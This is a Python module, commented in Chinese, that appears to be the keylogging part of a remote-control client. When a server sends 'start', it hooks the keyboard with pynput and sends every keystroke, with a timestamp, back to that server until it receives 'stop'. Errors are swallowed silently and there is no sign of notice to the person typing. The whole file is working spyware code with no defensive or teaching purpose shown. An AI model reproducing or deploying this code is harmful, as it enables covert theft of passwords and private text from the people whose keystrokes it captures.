# -*- coding: utf-8 -*-
"""按键记录处理器：通过 pynput 监听按键事件，实时上报 KEYLOG_DATA 到服务端。"""

import asyncio
import time
import threading
import sys
import os
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from common.protocol import MsgType, make_msg
from common.config import KEYLOG_MAX

try:
    from pynput import keyboard as pynput_kb
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

# 小键盘键码映射表
NUMPAD_MAP = {
    '96': '0', '97': '1', '98': '2', '99': '3', '100': '4',
    '101': '5', '102': '6', '103': '7', '104': '8', '105': '9',
    '106': '*', '107': '+', '108': ',', '109': '-', '110': '.', '111': '/'
}

# 去重状态：同一按键在 30ms 内视为硬件重复，跳过
_last_kb = {'key': None, 't': 0.0}

# 全局状态
_engine = None
_keylog_enabled = False
_keyboard_listener = None


def on_key_press(key):
    """pynput 按键回调，去重后通过 engine 上报 KEYLOG_DATA 消息。"""
    global _last_kb
    if not _keylog_enabled or _engine is None:
        return

    try:
        now = time.time()
        if hasattr(key, 'char') and key.char is not None:
            text = key.char
        else:
            name = getattr(key, 'name', str(key))
            text = NUMPAD_MAP.get(name, f'[{name}]')

        # 去重：同一按键 30ms 内视为硬件重复
        if text == _last_kb['key'] and (now - _last_kb['t']) < 0.03:
            return
        _last_kb = {'key': text, 't': now}

        entry = {'time': datetime.now().isoformat(), 'key': text}
        msg = make_msg(MsgType.KEYLOG_DATA, _engine.client_id, entry)
        asyncio.run_coroutine_threadsafe(_engine.send_msg(msg), _engine._loop)
    except Exception:
        pass


async def handle_keylog(engine, msg):
    """处理按键记录指令，支持 start 和 stop 两种 action。"""
    global _engine, _keylog_enabled, _keyboard_listener
    payload = msg.get('payload', {})
    action = payload.get('action', 'start')

    if action == 'start':
        _engine = engine
        _keylog_enabled = True
        if PYNPUT_AVAILABLE and _keyboard_listener is None:
            _keyboard_listener = pynput_kb.Listener(on_press=on_key_press)
            _keyboard_listener.daemon = True
            _keyboard_listener.start()
        resp = make_msg(MsgType.KEYLOG, engine.client_id,
                        {'status': 'started'}, msg.get('seq', 0))

    elif action == 'stop':
        _keylog_enabled = False
        if _keyboard_listener:
            _keyboard_listener.stop()
            _keyboard_listener = None
        resp = make_msg(MsgType.KEYLOG, engine.client_id,
                        {'status': 'stopped'}, msg.get('seq', 0))

    else:
        resp = make_msg(MsgType.ERROR, engine.client_id,
                        {'error': f'Unknown action: {action}'},
                        msg.get('seq', 0))

    await engine.send_msg(resp)
